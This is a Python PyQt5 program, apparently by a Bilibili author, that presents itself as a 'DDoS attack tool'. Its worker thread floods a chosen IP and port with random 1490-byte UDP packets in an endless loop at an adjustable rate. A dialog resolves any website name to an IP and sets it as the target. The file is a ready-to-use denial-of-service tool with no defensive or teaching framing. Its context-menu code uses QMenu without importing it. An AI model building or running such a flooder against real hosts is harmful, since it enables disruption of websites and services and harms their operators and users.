import sys
import os
import time
import socket
import random
from datetime import datetime
# 在文件顶部添加导入
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
                           QHBoxLayout, QLabel, QLineEdit, QSpinBox, QSlider,
                           QPushButton, QTextEdit, QMessageBox, QDialog)  # 添加QDialog
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont, QPalette, QColor

class AttackThread(QThread):
    update_signal = pyqtSignal(str)
    
    def __init__(self, ip, port, speed):
        super().__init__()
        self.ip = ip
        self.port = port
        self.speed = speed
        self.is_running = True
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.bytes = random._urandom(1490)

    def run(self):
        sent = 0
        while self.is_running:
            try:
                self.sock.sendto(self.bytes, (self.ip, self.port))
                sent += 1
                self.update_signal.emit(f"已发送 {sent} 个数据包到 {self.ip} 端口 {self.port}")
                time.sleep((1000-self.speed)/2000)
            except Exception as e:
                self.update_signal.emit(f"发送失败: {str(e)}")
                break

    def stop(self):
        self.is_running = False

class DDosGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.attack_thread = None
        self.initUI()

    def initUI(self):
        self.setWindowTitle('DDos 攻击工具 by 睿星')
        self.setStyleSheet("""
            QMainWindow {
                background-color: #f5f5f5;
                color: #333333;
            }
            QMenuBar, QMenuBar::item {
                background-color: #f5f5f5;
                color: #333333;
            }
            QMenu {
                background-color: white;
                color: #333333;
                border: 1px solid #cccccc;
            }
            QMenu::item:selected {
                background-color: #4a90e2;
                color: white;
            }
            QLineEdit {
                background-color: white;
                border: 1px solid #cccccc;
                padding: 8px;
                border-radius: 4px;
                min-width: 300px;
            }
            QLineEdit:focus {
                border: 1px solid #4a90e2;
            }
            QSpinBox {
                background-color: white;
                border: 1px solid #cccccc;
                padding: 5px;
            }
            QSpinBox:focus {
                border: 1px solid #4a90e2;
            }
            QTextEdit {
                background-color: white;
                border: 1px solid #cccccc;
                padding: 10px;
                border-radius: 4px;
            }
            QPushButton {
                padding: 8px;
                border-radius: 4px;
                font-size: 14px;
                min-width: 120px;
            }
        """)
        self.setMinimumSize(800, 600)

        # 创建主窗口部件和布局
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout(main_widget)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)

        # 标题
        title_label = QLabel('DDos 攻击工具by睿星')
        title_label.setFont(QFont('Microsoft YaHei', 24, QFont.Bold))
        title_label.setStyleSheet("color: #00aaff;")
        title_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(title_label)

        # IP输入
        ip_layout = QHBoxLayout()
        ip_label = QLabel('目标 IP:')
        ip_label.setFont(QFont('Microsoft YaHei', 10))
        self.ip_input = QLineEdit()
        self.ip_input.setFont(QFont('Microsoft YaHei', 10))
        # IP输入框样式
        self.ip_input.setStyleSheet("""
            QLineEdit {
                background-color: #ffffff;
                color: #000000;  /* 修改为黑色文本 */
                border: 1px solid #555555;
                padding: 8px;
                border-radius: 4px;
                min-width: 300px;
            }
            QLineEdit:focus {
                border: 1px solid #00aaff;
            }
        """)

        # 添加获取IP按钮
        self.get_ip_button = QPushButton('获取网址IP')
        self.get_ip_button.setFont(QFont('Microsoft YaHei', 10))
        self.get_ip_button.setStyleSheet("""
            QPushButton {
                background-color: #0066cc;
                color: white;
                padding: 8px;
                border-radius: 4px;
                min-width: 100px;
            }
            QPushButton:hover {
                background-color: #0055aa;
            }
        """)
        self.get_ip_button.clicked.connect(self.show_get_ip_dialog)
        
        ip_layout.addWidget(ip_label)
        ip_layout.addWidget(self.ip_input)
        ip_layout.addWidget(self.get_ip_button)
        layout.addLayout(ip_layout)

        # 端口输入
        port_layout = QHBoxLayout()
        port_label = QLabel('攻击端口:')
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(80)
        # 端口输入框修改
        self.port_input.setStyleSheet(
            "QSpinBox { background-color: #ffffff; color: #000000; border: 1px solid #555555; padding: 5px; }"
            "QSpinBox:focus { border: 1px solid #00aaff; }")
        port_layout.addWidget(port_label)
        port_layout.addWidget(self.port_input)
        layout.addLayout(port_layout)

        # 速度滑块
        speed_layout = QHBoxLayout()
        speed_label = QLabel('攻击速度:')
        self.speed_slider = QSlider(Qt.Horizontal)
        self.speed_slider.setRange(1, 1000)
        self.speed_slider.setValue(500)
        self.speed_value = QLabel('500')
        self.speed_slider.valueChanged.connect(lambda v: self.speed_value.setText(str(v)))
        speed_layout.addWidget(speed_label)
        speed_layout.addWidget(self.speed_slider)
        speed_layout.addWidget(self.speed_value)
        layout.addLayout(speed_layout)

        # 控制按钮
        button_layout = QHBoxLayout()
        button_layout.setSpacing(15)
        self.start_button = QPushButton('开始攻击')
        self.stop_button = QPushButton('停止攻击')
        
        # 现在可以安全地设置按钮样式
        self.start_button.setStyleSheet("""
            QPushButton {
                background-color: #4CAF50;
                color: white;
            }
            QPushButton:hover {
                background-color: #3e8e41;
            }
            QPushButton:disabled {
                background-color: #cccccc;
            }
        """)
        self.stop_button.setStyleSheet("""
            QPushButton {
                background-color: #f44336;
                color: white;
            }
            QPushButton:hover {
                background-color: #d32f2f;
            }
            QPushButton:disabled {
                background-color: #cccccc;
            }
        """)

        # 添加按钮到布局并连接信号
        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)
        layout.addLayout(button_layout)
        
        # 连接按钮信号到槽函数
        self.start_button.clicked.connect(self.start_attack)
        self.stop_button.clicked.connect(self.stop_attack)
        # 初始状态下停止按钮禁用
        self.stop_button.setEnabled(False)

        # 状态显示
        self.status_display = QTextEdit()
        self.status_display.setReadOnly(True)
        self.status_display.setFont(QFont('Consolas', 10))
        self.status_display.setStyleSheet("""
            QTextEdit {
                background-color: #ffffff;
                color: #000000;
                border: 1px solid #555555;
                padding: 10px;
                border-radius: 4px;
            }
        """)
        layout.addWidget(self.status_display)

        # 版权信息
        copyright_label = QLabel('作者: 哔哩哔哩@睿星zzy | 作者GitHub: https://github.com/Ruixing-Bilibili')
        copyright_label.setFont(QFont('Microsoft YaHei', 9))
        copyright_label.setAlignment(Qt.AlignCenter)
        copyright_label.setStyleSheet("color: #888888;")
        layout.addWidget(copyright_label)

        # 启用中文右键菜单
        self.setContextMenuPolicy(Qt.CustomContextMenu)
        self.customContextMenuRequested.connect(self.show_context_menu)

    def show_context_menu(self, pos):
        context_menu = QMenu(self)
        
        # 中文菜单项
        copy_action = context_menu.addAction("复制")
        paste_action = context_menu.addAction("粘贴")
        context_menu.addSeparator()
        select_all_action = context_menu.addAction("全选")
        
        # 获取当前焦点控件
        focused_widget = QApplication.focusWidget()
        
        # 连接动作
        copy_action.triggered.connect(lambda: focused_widget.copy() if hasattr(focused_widget, 'copy') else None)
        paste_action.triggered.connect(lambda: focused_widget.paste() if hasattr(focused_widget, 'paste') else None)
        select_all_action.triggered.connect(lambda: focused_widget.selectAll() if hasattr(focused_widget, 'selectAll') else None)
        
        context_menu.exec_(self.mapToGlobal(pos))

    def start_attack(self):
        if not self.ip_input.text():
            QMessageBox.warning(self, '错误', '请输入目标IP地址')
            return

        # 确保按钮状态正确
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.status_display.clear()

        # 检查线程是否已经存在
        if self.attack_thread is not None:
            self.attack_thread.stop()
            self.attack_thread.wait()

        # 创建并启动攻击线程
        self.attack_thread = AttackThread(
            self.ip_input.text(),
            self.port_input.value(),
            self.speed_slider.value()
        )
        self.attack_thread.update_signal.connect(self.update_status)
        self.attack_thread.start()

    def stop_attack(self):
        if self.attack_thread:
            self.attack_thread.stop()
            self.attack_thread.wait()
            self.attack_thread = None

        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.status_display.append('攻击已停止')

    def update_status(self, message):
        self.status_display.append(message)
        self.status_display.verticalScrollBar().setValue(
            self.status_display.verticalScrollBar().maximum()
        )

    def closeEvent(self, event):
        if self.attack_thread:
            self.stop_attack()
        event.accept()

    def show_get_ip_dialog(self):
        dialog = QDialog(self)
        dialog.setWindowTitle('获取网址IP')
        dialog.setMinimumWidth(450)
        dialog.setStyleSheet("""
            QDialog {
                background-color:rgb(129, 125, 125);
                color:rgb(163, 151, 151);
            }
            QLabel {
                font-size: 14px;
                color:rgb(255, 255, 255);
            }
            QLineEdit {
                background-color: #ffffff;  /* 修改背景颜色为白色 */
                color:rgb(0, 0, 0);  /* 修改文本颜色为黑色 */
                border: 1px solid #cccccc;
                padding: 8px;
                border-radius: 4px;
                font-size: 14px;
                min-width: 300px;
            }
            QPushButton {
                background-color: #4a90e2;
                color: white;
                padding: 8px 16px;
                border-radius: 4px;
                font-size: 14px;
                min-width: 80px;
            }
            QPushButton:hover {
                background-color: #3a7bc8;
            }
        """)
        
        layout = QVBoxLayout(dialog)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)
        
        # 网址输入部分
        url_layout = QHBoxLayout()
        url_label = QLabel('输入网址:')
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText('例如: www.example.com')
        url_layout.addWidget(url_label)
        url_layout.addWidget(self.url_input)
        
        # 结果显示部分
        result_layout = QHBoxLayout()
        result_label = QLabel('IP地址:')
        self.ip_result = QLineEdit()
        self.ip_result.setReadOnly(True)
        result_layout.addWidget(result_label)
        result_layout.addWidget(self.ip_result)
        
        # 按钮部分
        button_box = QHBoxLayout()
        button_box.addStretch()
        get_button = QPushButton('获取IP')
        get_button.clicked.connect(lambda: self.get_ip_from_url(self.url_input.text()))
        close_button = QPushButton('关闭')
        close_button.clicked.connect(dialog.close)
        button_box.addWidget(get_button)
        button_box.addWidget(close_button)
        
        # 添加到主布局
        layout.addLayout(url_layout)
        layout.addLayout(result_layout)
        layout.addStretch()
        layout.addLayout(button_box)
        
        dialog.exec_()

    def get_ip_from_url(self, url):
        try:
            if not url:
                QMessageBox.warning(self, '错误', '请输入网址')
                return
                
            # 去除协议部分
            if url.startswith('http://'):
                url = url[7:]
            elif url.startswith('https://'):
                url = url[8:]
                
            # 去除路径部分
            url = url.split('/')[0]
            
            ip = socket.gethostbyname(url)
            self.ip_result.setText(ip)
            self.ip_input.setText(ip)  # 自动填充到主窗口的IP输入框
        except Exception as e:
            QMessageBox.critical(self, '错误', f'获取IP失败: {str(e)}')

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = DDosGUI()
    window.show()
    sys.exit(app.exec_())